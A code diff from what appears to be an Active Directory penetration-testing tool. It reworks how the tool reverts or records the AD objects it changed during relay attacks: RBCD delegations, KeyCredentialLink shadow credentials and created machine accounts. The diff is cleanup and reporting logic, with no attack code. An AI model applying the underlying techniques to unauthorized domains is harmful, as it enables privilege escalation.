@@ -2206,6 +2435,20 @@ def _delete_delegate(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None
         # until a privileged account removes it.
         target = delegate.sam or dn
         disabled = False
+        if not state.extra.get("allow_disable_fallback", True):
+            # A stronger credential is still to be tried in the cascade: report
+            # the failure (the cascade defers it) and leave the object as is.
+            if ledger is not None and delegate.ledger_change_id:
+                ledger.mark_manual_required(
+                    delegate.ledger_change_id,
+                    reason=_cleanup_manual_reason(exc),
+                    remediation_command=(
+                        f"Delete the machine account {target} with a privileged account."
+                    ),
+                    remediation_object_dn=str(dn or ""),
+                    error=str(exc),
+                )
+            return
         if dn:
             try:
                 # WORKSTATION_TRUST_ACCOUNT (0x1000) | ACCOUNTDISABLE (0x2) = 4098.
@@ -2232,16 +2475,39 @@ def _delete_delegate(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None
             )
         if ledger is not None and delegate.ledger_change_id:
             if disabled and _verify_machine_neutralized(conn, sam=delegate.sam):
-                # DISABLE is a verifiable, neutralizing revert; confirm it but keep
-                # the manual instruction visible so the operator removes the orphan.
-                ledger.set_revert_metadata(
-                    delegate.ledger_change_id,
-                    remediation_command=instructions,
-                    remediation_object_dn=str(dn or ""),
+                # Disabled is NOT reverted: the object still exists and still holds
+                # one of its creator's quota slots. It is disclosed as manual with
+                # the burn forecast, and ``neutralized_only`` lets the final retry
+                # pass delete it with a stronger credential obtained later.
+                from adscan_core.reporting.cleanup_disclosures import (  # noqa: PLC0415
+                    MANUAL_REASON_NEUTRALIZED,
+                    neutralized_machine_account_remediation,
                 )
-                ledger.mark_reverted_confirmed(
+
+                entry = None
+                get_change = getattr(ledger, "get_change", None)
+                if callable(get_change):
+                    entry = get_change(delegate.ledger_change_id)
+                detail = (entry or {}).get("detail") or {}
+                quota = detail.get("actor_domain_quota")
+                update_detail = getattr(ledger, "update_detail", None)
+                if callable(update_detail):
+                    update_detail(
+                        delegate.ledger_change_id,
+                        neutralized_only=True,
+                        dn=str(dn or ""),
+                        sam=str(delegate.sam or ""),
+                    )
+                ledger.mark_manual_required(
                     delegate.ledger_change_id,
-                    verification_method="machine_account_reread",
+                    reason=MANUAL_REASON_NEUTRALIZED,
+                    remediation_command=neutralized_machine_account_remediation(
+                        sam_account_name=str(delegate.sam or target or ""),
+                        creator=str(detail.get("executor_username") or "") or None,
+                        domain_quota=quota if isinstance(quota, int) else None,
+                    ),
+                    remediation_object_dn=str(dn or ""),
+                    error=str(exc),
                 )
             else:
                 ledger.mark_manual_required(
@@ -2253,58 +2519,6 @@ def _delete_delegate(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None
                 )
         elif not disabled:
             print_error(f"Failed to delete or disable delegate account: {exc}")
-
-
-def _mark_cleanup_failed_manual(ledger: Any, state: _RbcdLedgerState, *, error: str) -> None:
-    """Mark every pending ledger entry manual when the cleanup connection failed."""
-    if ledger is None:
-        return
-    reason = _cleanup_manual_reason(error)
-    if state.rbcd_change_id:
-        try:
-            ledger.mark_manual_required(
-                state.rbcd_change_id,
-                reason=reason,
-                remediation_command=(
-                    "Clear or restore msDS-AllowedToActOnBehalfOfOtherIdentity on the "
-                    "target with a privileged account."
-                ),
-                remediation_object_dn=str(state.rbcd_target_dn or ""),
-                error=error,
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-    if state.shadow_change_id:
-        try:
-            ledger.mark_manual_required(
-                state.shadow_change_id,
-                reason=reason,
-                remediation_command=(
-                    "Restore msDS-KeyCredentialLink on the target to its prior value list."
-                ),
-                remediation_object_dn=str(state.shadow_target_dn or ""),
-                error=error,
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-    delegate = state.delegate
-    if delegate is not None and delegate.created and delegate.ledger_change_id:
-        try:
-            ledger.mark_manual_required(
-                delegate.ledger_change_id,
-                reason=reason,
-                remediation_command=(
-                    f"Delete the machine account {delegate.sam or delegate.dn} with a "
-                    "privileged account."
-                ),
-                remediation_object_dn=str(delegate.dn or ""),
-                error=error,
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
 
 
 # --------------------------------------------------------------------------- #
@@ -2335,10 +2549,12 @@ def _state_from_ledger_entry(entry: dict[str, Any]) -> _RbcdLedgerState:
         state.shadow_change_id = change_id
         state.shadow_target_dn = detail.get("target_dn")
         state.shadow_prior_values = list(detail.get("prior_keycred_values") or [])
-    elif kind == "machine_account_created":
+    elif kind in ("machine_account_created", "computer_account_created"):
+        # ``computer_account_created`` is the ESC14 record of the same object
+        # class; the final retry pass deletes it with the same executor.
         state.delegate = _PlannedDelegate(
             sid=str(detail.get("sid") or ""),
-            sam=detail.get("sam") or entry.get("target"),
+            sam=detail.get("sam") or detail.get("computer_name") or entry.get("target"),
             dn=detail.get("dn"),
             created=True,
             ledger_change_id=change_id,
@@ -2346,45 +2562,66 @@ def _state_from_ledger_entry(entry: dict[str, Any]) -> _RbcdLedgerState:
     return state
 
 
-def _revert_one_ledger_entry(conn: Any, *, ledger: Any, entry: dict[str, Any]) -> None:
-    """Dispatch the revert for one operator_confirmed ledger entry by its kind."""
-    state = _state_from_ledger_entry(entry)
-    kind = str(entry.get("kind") or "")
-    if kind == "rbcd_delegation_added":
-        _revert_rbcd(conn, ledger=ledger, state=state)
-    elif kind == "keycredentiallink_added":
-        _revert_shadow_creds(conn, ledger=ledger, state=state)
-    elif kind == "machine_account_created":
-        _delete_delegate(conn, ledger=ledger, state=state)
+#: Durable ``operator_confirmed`` kinds the exit hook knows how to revert (and
+#: confirm by re-reading). Any other ``operator_confirmed`` kind still standing at
+#: exit is left to ``ledger.finalize()``, which records it ``manual_required``
+#: with its native command and DN: offering it here would promise a revert that
+#: no dispatcher performs.
+_EXIT_REVERTABLE_KINDS: frozenset[str] = frozenset(
+    {"machine_account_created", "rbcd_delegation_added", "keycredentiallink_added"}
+)
 
 
 def _exit_revert_decision(shell: Any, entries: list[dict[str, Any]]) -> list[dict[str, Any]]:
-    """Decide which durable changes to revert at exit (interactive + CI policy).
+    """Decide which durable changes to revert at exit.
 
-    Returns the subset of ``entries`` the operator chose to revert. Policy:
-      * Non-interactive + CI marker present -> revert ALL (leave a clean lab).
-      * Non-interactive + no CI marker -> KEEP all (durable assets the operator
-        may still want; default-safe for an unattended customer engagement).
-      * Interactive -> prompt "Revert all / Keep all / Select", and on "Select"
-        a multi-choice of the individual changes.
+    Returns the subset of ``entries`` to revert. The decision is NOT made here:
+    :func:`adscan_internal.services.durable_change_policy.resolve_exit_keep_decision`
+    is the single place that decides, so every exit path agrees:
+      * explicit operator choice (scan config ``durable_changes.keep`` or
+        ``ADSCAN_KEEP_DURABLE_CHANGES``) wins in every mode;
+      * otherwise non-interactive (``adscan ci``, the appliance) -> revert ALL;
+      * otherwise interactive -> prompt "Revert all / Keep all / Select", with
+        "Revert all" preset, and on "Select" a multi-choice of the changes.
     """
     from adscan_core.output import (  # noqa: PLC0415
         questionary_checkbox_values,
         questionary_select_index,
     )
+    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
+        KEEP_DURABLE_CHANGES_ENV,
+        resolve_exit_keep_decision,
+    )
 
-    if is_non_interactive(shell):
-        if is_ci_marker_present():
-            print_info(
-                f"Non-interactive CI run — reverting {len(entries)} ADscan-created "
-                "AD object(s) to leave a clean lab."
-            )
-            return list(entries)
+    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
+        AUTO_REVERT_ENV,
+    )
+
+    decision = resolve_exit_keep_decision(shell, non_interactive_fn=is_non_interactive)
+    if decision.mode == "keep":
+        origin = {
+            "scan_config": "scan configuration durable_changes.auto_revert",
+            "repl": "set auto_revert off",
+            "env": f"{AUTO_REVERT_ENV} / {KEEP_DURABLE_CHANGES_ENV}",
+            "non_interactive_default": "automatic reversion is off for this workspace type",
+        }.get(decision.source, decision.source)
         print_info(
-            f"Non-interactive run — keeping {len(entries)} ADscan-created AD "
-            "object(s) (durable assets retained by default)."
+            f"Keeping {len(entries)} ADscan-created AD object(s) ({origin}); each "
+            "stays in the report as kept, with its DN."
         )
         return []
+    if decision.mode == "revert":
+        if decision.source == "non_interactive_default":
+            print_info(
+                f"Unattended run: reverting {len(entries)} ADscan-created AD "
+                f"object(s). To keep them, set {AUTO_REVERT_ENV}=0 or "
+                "durable_changes.auto_revert: false in the scan configuration."
+            )
+        else:
+            print_info(
+                f"Reverting {len(entries)} ADscan-created AD object(s) as configured."
+            )
+        return list(entries)
 
     options = [
         f"{_exit_kind_label(e)} · {mark_sensitive(str(e.get('target') or ''), 'text')}"
@@ -2399,7 +2636,9 @@ def _exit_revert_decision(shell: Any, entries: list[dict[str, Any]]) -> list[dic
     idx = questionary_select_index(
         title="Revert these AD changes now?",
         options=["Revert all", "Keep all", "Select which to revert"],
-        default_idx=0,  # default: REVERT (delete/disable + restore) → clean exit
+        # The automatic-reversion default for this workspace type: Revert in an
+        # audit (clean exit), Keep in a ctf.
+        default_idx=1 if getattr(decision, "preset", "revert") == "keep" else 0,
         shell=shell,
     )
     if idx == 1:
@@ -2435,15 +2674,17 @@ def _exit_kind_label(entry: dict[str, Any]) -> str:
 def run_operator_confirmed_exit_cleanup(shell: Any) -> None:
     """Prompt + revert durable operator_confirmed changes at workspace exit.
 
-    Called from the workspace-exit hook. Gathers the still-standing
-    ``operator_confirmed`` changes from the ledger, asks the operator whether to
-    revert them (non-interactive policy: CI reverts all, otherwise keep), reverts
-    only the chosen ones (RBCD restore / KeyCredentialLink restore / machine
+    Called from the workspace-exit hook (and by ``adscan ci`` before it renders
+    the report, so the deliverable shows the final state; a second call is a
+    no-op because resolved entries are terminal). Gathers the still-standing
+    ``operator_confirmed`` changes this hook can revert, resolves keep/revert
+    through ``durable_change_policy`` (non-interactive: revert unless the
+    operator explicitly chose to keep), reverts only the chosen ones (RBCD restore / KeyCredentialLink restore / machine
     account delete with disable-fallback), and marks the rest KEPT. Best-effort:
     any failure is captured and never blocks shutdown. The ``auto_revert`` class
     is untouched here (the owning services already auto-revert it at exit).
     """
-    ledger = getattr(shell, "environment_change_ledger", None)
+    ledger = active_ledger(shell)
     if ledger is None:
         return
     try:
@@ -2452,6 +2693,9 @@ def run_operator_confirmed_exit_cleanup(shell: Any) -> None:
         telemetry.capture_exception(exc)
         print_exception(exception=exc)
         return
+    entries = [
+        e for e in entries if str(e.get("kind") or "") in _EXIT_REVERTABLE_KINDS
+    ]
     if not entries:
         return
 
@@ -2463,11 +2707,31 @@ def run_operator_confirmed_exit_cleanup(shell: Any) -> None:
     to_revert = _exit_revert_decision(shell, entries)
     revert_ids = {str(e.get("change_id")) for e in to_revert}
 
-    # Mark the kept ones immediately (so the cleanup report shows them as kept).
+    # Mark the kept ones immediately (so the cleanup report shows them as kept),
+    # with WHY: the operator chose it, or automatic reversion was off.
+    from adscan_core.reporting.cleanup_disclosures import (  # noqa: PLC0415
+        KEPT_REASON_AUTO_REVERT_OFF,
+        KEPT_REASON_OPERATOR,
+    )
+    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
+        resolve_exit_keep_decision,
+    )
+
+    try:
+        keep_source = resolve_exit_keep_decision(
+            shell, non_interactive_fn=is_non_interactive
+        ).source
+    except Exception:  # noqa: BLE001 - the label only words the reason
+        keep_source = "interactive"
+    kept_reason = (
+        KEPT_REASON_OPERATOR
+        if keep_source in ("interactive", "repl")
+        else KEPT_REASON_AUTO_REVERT_OFF
+    )
     for entry in entries:
         if str(entry.get("change_id")) not in revert_ids:
             try:
-                ledger.mark_kept(str(entry.get("change_id")))
+                ledger.mark_kept(str(entry.get("change_id")), reason=kept_reason)
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
                 print_exception(exception=exc)
@@ -2475,86 +2739,61 @@ def run_operator_confirmed_exit_cleanup(shell: Any) -> None:
     if not to_revert:
         return
 
-    from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
-        ADscanLDAPConfig,
-        ADscanLDAPConnection,
-    )
-
     domains_data = getattr(shell, "domains_data", {}) or {}
     for domain, domain_entries in by_domain.items():
-        chosen = [e for e in domain_entries if str(e.get("change_id")) in revert_ids]
-        if not chosen:
+        chosen_all = [e for e in domain_entries if str(e.get("change_id")) in revert_ids]
+        if not chosen_all:
             continue
         domain_data = domains_data.get(domain) or {}
         dc_ip = resolve_dc_ip(domain_data) if domain_data else None
-        username, secret = _shell_domain_creds(shell, domain)
-        if not dc_ip or not username or not secret:
-            print_warning(
-                f"Cannot revert {len(chosen)} change(s) in "
-                f"{mark_sensitive(domain or '?', 'domain')}: missing DC/credentials. "
-                "They are recorded with manual-cleanup instructions."
-            )
-            for entry in chosen:
-                try:
-                    ledger.mark_manual_required(
-                        str(entry.get("change_id")),
-                        reason=_cleanup_manual_reason("missing credential"),
-                        remediation_command=(
-                            "Re-authenticate to the domain and revert this change "
-                            "manually (no DC/credentials available at exit)."
-                        ),
-                        remediation_object_dn=str(
-                            (entry.get("detail") or {}).get("target_dn")
-                            or entry.get("target")
-                            or ""
-                        ),
-                        error="No DC/credentials available at exit.",
-                    )
-                except Exception as exc:  # noqa: BLE001
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
-            continue
-
-        is_nt = _looks_like_nt_hash(secret)
-        config = ADscanLDAPConfig(
-            domain=domain,
-            dc_ip=dc_ip,
-            use_ldaps=True,
-            use_kerberos=False,
-            username=username,
-            password=None if is_nt else secret,
-        )
         print_info(
-            f"Reverting {len(chosen)} AD change(s) in "
-            f"{mark_sensitive(domain or '?', 'domain')} as requested…"
+            f"Reverting {len(chosen_all)} AD change(s) in "
+            f"{mark_sensitive(domain or '?', 'domain')}…"
         )
-        try:
-            with ADscanLDAPConnection(config) as conn:
-                for entry in chosen:
-                    _revert_one_ledger_entry(conn, ledger=ledger, entry=entry)
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-            print_error(f"Exit cleanup connection failed: {exc}")
-            for entry in chosen:
-                try:
-                    ledger.mark_manual_required(
-                        str(entry.get("change_id")),
-                        reason=_cleanup_manual_reason(str(exc)),
-                        remediation_command=(
-                            "Revert this change manually — the exit cleanup "
-                            "connection failed."
-                        ),
-                        remediation_object_dn=str(
-                            (entry.get("detail") or {}).get("target_dn")
-                            or entry.get("target")
-                            or ""
-                        ),
-                        error=str(exc),
-                    )
-                except Exception as iexc:  # noqa: BLE001
-                    telemetry.capture_exception(iexc)
-                    print_exception(exception=iexc)
+        for entry in sorted(chosen_all, key=_exit_revert_order):
+            revert_ledger_entry_with_cascade(shell, ledger=ledger, entry=entry, dc_ip=dc_ip)
+
+
+def _exit_revert_order(entry: dict[str, Any]) -> int:
+    """Grants before the delegate account they reference."""
+    return 1 if str(entry.get("kind") or "") == "machine_account_created" else 0
+
+
+def revert_ledger_entry_with_cascade(
+    shell: Any,
+    *,
+    ledger: Any,
+    entry: dict[str, Any],
+    dc_ip: Optional[str] = None,
+    exclude: tuple[str, ...] = (),
+) -> bool:
+    """Revert one relay-chain ledger entry with the shared revert precedence.
+
+    Also the dispatcher the final retry pass uses for these kinds. Returns True
+    when the revert was confirmed.
+    """
+    domain = str(entry.get("domain") or "")
+    if dc_ip is None:
+        domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
+        dc_ip = resolve_dc_ip(domain_data) if domain_data else None
+    detail = dict(entry.get("detail") or {})
+    executor = str(detail.get("executor_username") or detail.get("exec_username") or "").strip()
+    state = _state_from_ledger_entry(entry)
+    kind = str(entry.get("kind") or "")
+    if kind == "computer_account_created":
+        kind = "machine_account_created"
+    unit = (kind, str(entry.get("change_id") or "") or None, state)
+    return _cascade_revert_unit(
+        shell,
+        ledger=ledger,
+        domain=domain,
+        dc_ip=dc_ip,
+        unit=unit,
+        creator_username=executor,
+        exclude=tuple(exclude),
+    )
+
+
 
 
 __all__ = [
@@ -2563,4 +2802,5 @@ __all__ = [
     "run_relay_rbcd",
     "run_relay_ldap",
     "run_operator_confirmed_exit_cleanup",
+    "revert_ledger_entry_with_cascade",
 ]
